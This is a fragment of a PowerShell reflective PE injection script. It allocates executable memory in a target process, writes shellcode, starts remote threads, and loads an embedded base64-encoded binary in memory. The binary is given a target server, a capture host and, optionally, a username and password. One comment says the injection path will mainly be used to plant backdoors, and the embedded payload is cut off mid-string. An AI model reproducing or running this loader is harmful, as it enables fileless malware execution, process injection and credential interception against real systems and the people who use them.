                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                $SCPSMemOriginal = $SCPSMem

                Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)

                $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($RSCAddr -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }

                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }

                $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }

                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq "EXE")
        {
            #Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
            [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
            $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

            #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
            #   This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
            [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."

            $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while($true)
            {
                [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
                if ($ThreadDone -eq 1)
                {
                    Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }

        return @($PEInfo.PEHandle, $EffectivePEHandle)
    }


    Function Invoke-MemoryFreeLibrary
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $PEHandle
        )

        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types

        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants

        #Call FreeLibrary for all the imports of the DLL
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)

                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }

                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
                $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

                if ($ImportDllHandle -eq $null)
                {
                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
                }

                $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
                if ($Success -eq $false)
                {
                    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
                }

                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }

        #Call DllMain with process detach
        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

        $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null


        $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($Success -eq $false)
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }


    Function Main
    {
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        $Win32Constants =  Get-Win32Constants

        $RemoteProcHandle = [IntPtr]::Zero

        #If a remote process to inject in to is specified, get a handle to it
        if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($ProcName -ne $null -and $ProcName -ne "")
        {
            $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
            if ($Processes.Count -eq 0)
            {
                Throw "Can't find process $ProcName"
            }
            elseif ($Processes.Count -gt 1)
            {
                $ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
                Write-Output $ProcInfo
                Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
            }
            else
            {
                $ProcId = $Processes[0].ID
            }
        }

        #Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
        #If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#       if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#       {
#           Write-Verbose "Getting SeDebugPrivilege"
#           Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#       }

        if (($ProcId -ne $null) -and ($ProcId -ne 0))
        {
            $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
            if ($RemoteProcHandle -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $ProcId"
            }

            Write-Verbose "Got the handle for the remote process to inject in to"
        }


        #Load the PE reflectively
        Write-Verbose "Calling Invoke-MemoryLoadLibrary"

        try
        {
            $Processors = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }

        if ($Processors -is [array])
        {
            $Processor = $Processors[0]
        } else {
            $Processor = $Processors
        }

        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( "Architecture: " + $Processor.AddressWidth + " Process: " + ([System.IntPtr]::Size * 8))
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }

        #Determine whether or not to use 32bit or 64bit bytes
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
        }
        else
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
        }
        $PEBytes[0] = 0
        $PEBytes[1] = 0
        $PEHandle = [IntPtr]::Zero
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
        }
        else
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
        }
        if ($PELoadedInfo -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }

        $PEHandle = $PELoadedInfo[0]
        $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process


        #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
        {
            #########################################
            ### YOUR CODE GOES HERE
            #########################################
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "powershell_reflective_miAquvwg"
                    if ($WStringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
                    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)
                    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
                    if ($OutputPtr -eq [IntPtr]::Zero)
                    {
                        Throw "Unable to get output, Output Ptr is NULL"
                    }
                    else
                    {
                        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
                        Write-Output $Output
                        $Win32Functions.LocalFree.Invoke($OutputPtr);
                    }
            #########################################
            ### END OF YOUR CODE
            #########################################
        }
        #For remote DLL injection, call a void function which takes no parameters
        elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
            if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }

            $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
            $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle

            #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
            $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
        }

        #Don't free a library if it is injected in a remote process
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            Invoke-MemoryFreeLibrary -PEHandle $PEHandle
        }
        else
        {
            #Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
            $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($Success -eq $false)
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }

        Write-Verbose "Done!"
    }

    Main
}

#Main function to either run the script locally or remotely
Function Main
{

    Write-Verbose "PowerShell ProcessID: $PID"

    $variables = New-Object System.Collections.Generic.List[System.Object]

    if ($username -eq $null)
    {
        $ExeArgs = "/server:$target /connect:$CaptureHost"
    }
    else
    {
        $ExeArgs = "/server:$target /connect:$CaptureHost /authuser:$username /authpassword:$Password"
    }


    [System.IO.Directory]::SetCurrentDirectory($pwd)

    $PEBytes64 = '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